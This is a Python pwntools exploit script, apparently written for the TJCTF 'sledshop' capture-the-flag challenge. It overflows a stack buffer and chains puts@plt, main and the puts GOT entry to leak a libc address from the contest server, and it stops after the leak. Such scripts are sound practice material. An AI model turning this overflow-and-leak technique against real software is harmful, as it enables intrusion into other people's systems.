from pwn import *

e = ELF("./sledshop")
#p = process("./sledshop")
p = remote("p1.tjctf.org","8010")

'''data = p.recv()
print data
buff = 'A'*64+p32(int("0x0",16))+'A'*8
print buff
p.sendline(buff)'''

#print p.recv()

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

print p.recv()

buff = "A"*(76+4)#'A'+'A'*63+p32(int("0x0",16))+'A'*8#"A"*(76+4)
puts_plt = e.symbols["puts"]
main = e.symbols['main']#e.symbols["main"]
arg = e.symbols["got.puts"]
#arg = int("0xf7f57a0b",16)

payload = buff+p32(puts_plt)+p32(main)+p32(arg)
p.sendline(payload)

sleep(1)

data = p.recv()
print data
#print p.recvuntil("Sorry, we are closed.")
#leak = p.recv(8)
#print leak.encode("hex")
#print p.recv()
'''
data = p.recvuntil("Sorry, we are closed.")
print data
leak = p.recvline()
print leak.encode("hex")
data = p.recv()
print data
'''
